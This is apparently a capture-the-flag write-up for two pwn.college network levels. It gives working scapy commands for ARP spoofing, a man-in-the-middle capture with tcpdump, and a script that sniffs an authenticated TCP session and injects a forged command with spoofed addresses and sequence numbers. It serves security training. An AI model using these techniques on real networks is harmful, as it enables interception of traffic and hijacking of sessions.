+++
title = "Intercepting Communication"
weight = 0
slug="intercepting_communication"
description = "Using tcpdump, scapy, and ip for network shenanigans"
+++

# Level 13
Scapy has a thing to do literally this. First, start a tcpdump in the background:
```
tcpdump -i eth0 -A port 31337 -w cap.pcap &
```

Then, from the scapy terminal:
```
>>> arp_mitm('10.0.0.2', '10.0.0.4', iface='eth0')
```

Wait a few seconds for the capture, then read the flag from the pcap:
```
tcpdump -r cap.pcap -A | grep pwn
```

# Level 14
First we want to have both targets route their traffic through us so we can sniff it. To do this, we send some arp messages.

From the scapy terminal:
```
>>> my_mac = get_if_hwaddr('eth0')
>>> sendp(Ether(src=my_mac, dst='ff:ff:ff:ff:ff:ff')/ARP(op='is-at', hwsrc=my_mac, psrc='10.0.0.4'), iface='eth0')
>>> sendp(Ether(src=my_mac, dst='ff:ff:ff:ff:ff:ff')/ARP(op='is-at', hwsrc=my_mac, psrc='10.0.0.4'), iface='eth0')
```

This should route all traffic through our host, you can verify it is set up by checking with the arp command, you should see something like:
```
# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.0.0.4                 ether   86:5c:4f:83:c9:57   C                     eth0
10.0.0.3                 ether   12:40:1d:de:bc:a4   C                     eth0
```

Running `tcpdump -A`, we can see their traffic. There is some sort of secret being sent for authentication, then a command. You can also just read "/challenge/run" to see the full details on the server and client code.

We need to sniff this traffic and then inject a `FLAG` command after the client has authenticated. We can write a scapy script for this:

``` py
from scapy.all import Raw, IP, TCP, sniff, send, ls

def packet_cb(packet):
    if packet.haslayer(Raw):
        raw_data = packet[Raw].load
        print(ls(packet[0][2]))
        if b'COMMAND' in raw_data:
            x = send(IP(dst='10.0.0.3', src='10.0.0.4')/TCP(sport=packet[0][2].dport, dport=packet[0][2].sport, flags='PA', seq=packet[0][2].ack, ack=packet[0][2].seq+1)/"FLAG\n")

sniff(prn=packet_cb, iface='eth0')
```

The main thing we care about above is getting the right seq value, as that is necessary for communicating properly. Another thing to note is I used ls for my printout since it was nice during debugging and development but it does clutter the output quite a bit. If you wanted it to be more clean you could just check for "pwn.college" in `raw_data` and print that out.
